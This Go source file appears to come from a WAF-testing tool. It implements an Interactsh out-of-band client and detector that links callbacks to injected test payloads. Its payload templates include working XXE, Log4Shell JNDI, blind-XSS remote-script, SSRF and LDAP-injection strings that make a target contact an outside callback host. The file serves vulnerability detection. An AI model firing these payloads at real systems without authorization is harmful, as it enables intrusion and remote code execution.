// Package oob provides Out-of-Band (OOB) detection for callback-based vulnerabilities
package oob

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
)

// InteractionType represents the type of OOB interaction
type InteractionType string

const (
	InteractionDNS   InteractionType = "dns"
	InteractionHTTP  InteractionType = "http"
	InteractionHTTPS InteractionType = "https"
	InteractionSMTP  InteractionType = "smtp"
	InteractionLDAP  InteractionType = "ldap"
	InteractionFTP   InteractionType = "ftp"
)

// Interaction represents a detected OOB callback
type Interaction struct {
	ID            string          `json:"id"`
	Type          InteractionType `json:"type"`
	Protocol      string          `json:"protocol"`
	FullID        string          `json:"full_id"`
	RemoteAddress string          `json:"remote_address"`
	Timestamp     time.Time       `json:"timestamp"`
	RawRequest    string          `json:"raw_request,omitempty"`
	RawResponse   string          `json:"raw_response,omitempty"`
	Metadata      map[string]any  `json:"metadata,omitempty"`
}

// PayloadConfig configures OOB payload generation
type PayloadConfig struct {
	CorrelationID string // Unique ID to correlate callbacks
	Type          InteractionType
	Extra         map[string]string
}

// Client interface for OOB servers
type Client interface {
	// GetServer returns the OOB server hostname
	GetServer() string
	// GeneratePayload creates a unique OOB callback URL/domain
	GeneratePayload(config PayloadConfig) string
	// Poll checks for interactions
	Poll(ctx context.Context) ([]Interaction, error)
	// Register registers the client with the server
	Register(ctx context.Context) error
	// Close closes the client connection
	Close() error
}

// InteractshClient implements interactsh.com client
type InteractshClient struct {
	serverURL     string
	secretKey     string
	correlationID string
	httpClient    *http.Client
	interactions  []Interaction
	mu            sync.RWMutex
	pollInterval  time.Duration
	registered    bool
}

// InteractshConfig configures the Interactsh client
type InteractshConfig struct {
	ServerURL    string        // Default: https://interact.sh
	SecretKey    string        // For private servers
	PollInterval time.Duration // Default: 5s
	Timeout      time.Duration // HTTP timeout
}

// DefaultInteractshConfig returns default configuration
func DefaultInteractshConfig() InteractshConfig {
	return InteractshConfig{
		ServerURL:    "https://interact.sh",
		PollInterval: 5 * time.Second,
		Timeout:      30 * time.Second,
	}
}

// NewInteractshClient creates an Interactsh client
func NewInteractshClient(config InteractshConfig) *InteractshClient {
	if config.ServerURL == "" {
		config.ServerURL = "https://interact.sh"
	}
	if config.PollInterval <= 0 {
		config.PollInterval = 5 * time.Second
	}
	if config.Timeout <= 0 {
		config.Timeout = 30 * time.Second
	}

	correlationID := generateCorrelationID()

	return &InteractshClient{
		serverURL:     config.ServerURL,
		secretKey:     config.SecretKey,
		correlationID: correlationID,
		httpClient:    &http.Client{Timeout: config.Timeout},
		interactions:  make([]Interaction, 0),
		pollInterval:  config.PollInterval,
	}
}

// GetServer returns the OOB callback server
func (c *InteractshClient) GetServer() string {
	// Extract hostname from URL
	server := strings.TrimPrefix(c.serverURL, "https://")
	server = strings.TrimPrefix(server, "http://")
	return server
}

// GetCorrelationID returns the correlation ID
func (c *InteractshClient) GetCorrelationID() string {
	return c.correlationID
}

// GeneratePayload creates a unique payload domain
func (c *InteractshClient) GeneratePayload(config PayloadConfig) string {
	id := config.CorrelationID
	if id == "" {
		id = c.correlationID
	}

	server := c.GetServer()
	uniqueID := generateUniqueID()

	// Format: <unique>.<correlation>.<server>
	return fmt.Sprintf("%s.%s.%s", uniqueID, id, server)
}

// GenerateDNSPayload creates a DNS callback payload
func (c *InteractshClient) GenerateDNSPayload() string {
	return c.GeneratePayload(PayloadConfig{Type: InteractionDNS})
}

// GenerateHTTPPayload creates an HTTP callback URL
func (c *InteractshClient) GenerateHTTPPayload() string {
	domain := c.GeneratePayload(PayloadConfig{Type: InteractionHTTP})
	return fmt.Sprintf("http://%s", domain)
}

// GenerateHTTPSPayload creates an HTTPS callback URL
func (c *InteractshClient) GenerateHTTPSPayload() string {
	domain := c.GeneratePayload(PayloadConfig{Type: InteractionHTTPS})
	return fmt.Sprintf("https://%s", domain)
}

// Register registers with the Interactsh server
func (c *InteractshClient) Register(ctx context.Context) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if c.registered {
		return nil
	}

	// For interactsh, registration is implicit
	// The correlation ID is used to poll for interactions
	c.registered = true
	return nil
}

// Poll checks for new interactions
func (c *InteractshClient) Poll(ctx context.Context) ([]Interaction, error) {
	url := fmt.Sprintf("%s/poll?id=%s&secret=%s",
		c.serverURL, c.correlationID, c.secretKey)

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := iohelper.ReadBodyDefault(resp.Body)
		return nil, fmt.Errorf("poll failed: %d - %s", resp.StatusCode, string(body))
	}

	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil {
		return nil, err
	}

	var pollResp struct {
		Data []struct {
			Protocol      string `json:"protocol"`
			UniqueID      string `json:"unique-id"`
			FullID        string `json:"full-id"`
			RawRequest    string `json:"raw-request"`
			RawResponse   string `json:"raw-response"`
			RemoteAddress string `json:"remote-address"`
			Timestamp     string `json:"timestamp"`
		} `json:"data"`
	}

	if err := json.Unmarshal(body, &pollResp); err != nil {
		return nil, err
	}

	var interactions []Interaction
	for _, d := range pollResp.Data {
		timestamp, _ := time.Parse(time.RFC3339, d.Timestamp)
		if timestamp.IsZero() {
			timestamp = time.Now()
		}

		interaction := Interaction{
			ID:            d.UniqueID,
			Type:          protocolToType(d.Protocol),
			Protocol:      d.Protocol,
			FullID:        d.FullID,
			RemoteAddress: d.RemoteAddress,
			Timestamp:     timestamp,
			RawRequest:    d.RawRequest,
			RawResponse:   d.RawResponse,
		}
		interactions = append(interactions, interaction)
	}

	c.mu.Lock()
	c.interactions = append(c.interactions, interactions...)
	c.mu.Unlock()

	return interactions, nil
}

// GetInteractions returns all collected interactions
func (c *InteractshClient) GetInteractions() []Interaction {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.interactions
}

// ClearInteractions removes all collected interactions
func (c *InteractshClient) ClearInteractions() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.interactions = make([]Interaction, 0)
}

// Close closes the client
func (c *InteractshClient) Close() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.registered = false
	return nil
}

// StartPolling starts continuous polling for interactions
func (c *InteractshClient) StartPolling(ctx context.Context, callback func([]Interaction)) {
	go func() {
		ticker := time.NewTicker(c.pollInterval)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				interactions, err := c.Poll(ctx)
				if err == nil && len(interactions) > 0 && callback != nil {
					callback(interactions)
				}
			}
		}
	}()
}

// OOBDetector manages OOB detection for security testing
type OOBDetector struct {
	client        Client
	payloads      map[string]PayloadInfo
	mu            sync.RWMutex
	detectedVulns []DetectedVulnerability
}

// PayloadInfo tracks payload metadata
type PayloadInfo struct {
	ID         string
	Payload    string
	TestName   string
	TargetURL  string
	Parameter  string
	InjectedAt time.Time
	VulnType   string
}

// DetectedVulnerability represents a confirmed OOB vulnerability
type DetectedVulnerability struct {
	PayloadInfo
	Interaction Interaction
	Confirmed   bool
	Severity    string
}

// NewOOBDetector creates an OOB detector
func NewOOBDetector(client Client) *OOBDetector {
	return &OOBDetector{
		client:        client,
		payloads:      make(map[string]PayloadInfo),
		detectedVulns: make([]DetectedVulnerability, 0),
	}
}

// RegisterPayload registers a payload for tracking
func (d *OOBDetector) RegisterPayload(info PayloadInfo) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.payloads[info.ID] = info
}

// GeneratePayload creates and registers a payload
func (d *OOBDetector) GeneratePayload(testName, targetURL, parameter, vulnType string) string {
	id := generateUniqueID()

	var payload string
	switch vulnType {
	case "xxe", "ssrf":
		if interactsh, ok := d.client.(*InteractshClient); ok {
			payload = interactsh.GenerateHTTPPayload()
		}
	case "log4j", "jndi":
		if interactsh, ok := d.client.(*InteractshClient); ok {
			domain := interactsh.GenerateDNSPayload()
			payload = fmt.Sprintf("${jndi:ldap://%s/a}", domain)
		}
	case "blind_xss", "xss":
		if interactsh, ok := d.client.(*InteractshClient); ok {
			payload = fmt.Sprintf("<script src=%s></script>", interactsh.GenerateHTTPPayload())
		}
	case "dns", "blind_sqli":
		if interactsh, ok := d.client.(*InteractshClient); ok {
			payload = interactsh.GenerateDNSPayload()
		}
	default:
		if interactsh, ok := d.client.(*InteractshClient); ok {
			payload = interactsh.GenerateHTTPPayload()
		}
	}

	info := PayloadInfo{
		ID:         id,
		Payload:    payload,
		TestName:   testName,
		TargetURL:  targetURL,
		Parameter:  parameter,
		InjectedAt: time.Now(),
		VulnType:   vulnType,
	}

	d.RegisterPayload(info)
	return payload
}

// CheckInteractions polls and correlates interactions
func (d *OOBDetector) CheckInteractions(ctx context.Context) ([]DetectedVulnerability, error) {
	interactions, err := d.client.Poll(ctx)
	if err != nil {
		return nil, err
	}

	d.mu.Lock()
	defer d.mu.Unlock()

	var newVulns []DetectedVulnerability
	for _, interaction := range interactions {
		// Try to correlate with registered payloads
		for id, info := range d.payloads {
			if strings.Contains(interaction.FullID, id) {
				vuln := DetectedVulnerability{
					PayloadInfo: info,
					Interaction: interaction,
					Confirmed:   true,
					Severity:    determineSeverity(info.VulnType),
				}
				newVulns = append(newVulns, vuln)
				d.detectedVulns = append(d.detectedVulns, vuln)
				break
			}
		}
	}

	return newVulns, nil
}

// GetDetectedVulnerabilities returns all detected vulnerabilities
func (d *OOBDetector) GetDetectedVulnerabilities() []DetectedVulnerability {
	d.mu.RLock()
	defer d.mu.RUnlock()
	return d.detectedVulns
}

// PayloadTemplates provides common OOB payload templates
type PayloadTemplates struct {
	server string
}

// NewPayloadTemplates creates payload templates
func NewPayloadTemplates(server string) *PayloadTemplates {
	return &PayloadTemplates{server: server}
}

// XXEPayload generates XXE OOB payloads
func (p *PayloadTemplates) XXEPayload(id string) string {
	return fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://%s.%s/">
]>
<foo>&xxe;</foo>`, id, p.server)
}

// SSRFPayload generates SSRF OOB payloads
func (p *PayloadTemplates) SSRFPayload(id string) string {
	return fmt.Sprintf("http://%s.%s/ssrf", id, p.server)
}

// Log4jPayload generates Log4Shell OOB payloads
func (p *PayloadTemplates) Log4jPayload(id string) string {
	return fmt.Sprintf("${jndi:ldap://%s.%s/a}", id, p.server)
}

// BlindXSSPayload generates blind XSS payloads
func (p *PayloadTemplates) BlindXSSPayload(id string) string {
	return fmt.Sprintf(`"><script src="https://%s.%s/x"></script>`, id, p.server)
}

// LDAPInjectionPayload generates LDAP injection payloads
func (p *PayloadTemplates) LDAPInjectionPayload(id string) string {
	return fmt.Sprintf("*)(uid=*))(|(uid=*%s.%s", id, p.server)
}

// Helper functions
func generateCorrelationID() string {
	bytes := make([]byte, 8)
	_, _ = rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func generateUniqueID() string {
	bytes := make([]byte, 4)
	_, _ = rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func protocolToType(protocol string) InteractionType {
	switch strings.ToLower(protocol) {
	case "dns":
		return InteractionDNS
	case "http":
		return InteractionHTTP
	case "https":
		return InteractionHTTPS
	case "smtp":
		return InteractionSMTP
	case "ldap":
		return InteractionLDAP
	case "ftp":
		return InteractionFTP
	default:
		return InteractionHTTP
	}
}

func determineSeverity(vulnType string) string {
	switch vulnType {
	case "log4j", "jndi", "rce":
		return "critical"
	case "xxe", "ssrf":
		return "high"
	case "blind_sqli", "sqli":
		return "high"
	case "blind_xss", "xss":
		return "medium"
	default:
		return "medium"
	}
}

// MockClient implements a mock OOB client for testing
type MockClient struct {
	server       string
	interactions []Interaction
	mu           sync.Mutex
}

// NewMockClient creates a mock client
func NewMockClient(server string) *MockClient {
	return &MockClient{
		server:       server,
		interactions: make([]Interaction, 0),
	}
}

func (m *MockClient) GetServer() string {
	return m.server
}

func (m *MockClient) GeneratePayload(config PayloadConfig) string {
	id := config.CorrelationID
	if id == "" {
		id = generateCorrelationID()
	}
	return fmt.Sprintf("%s.%s.%s", generateUniqueID(), id, m.server)
}

func (m *MockClient) Register(ctx context.Context) error {
	return nil
}

func (m *MockClient) Poll(ctx context.Context) ([]Interaction, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	interactions := m.interactions
	m.interactions = nil
	return interactions, nil
}

func (m *MockClient) Close() error {
	return nil
}

// AddInteraction adds a mock interaction
func (m *MockClient) AddInteraction(interaction Interaction) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.interactions = append(m.interactions, interaction)
}
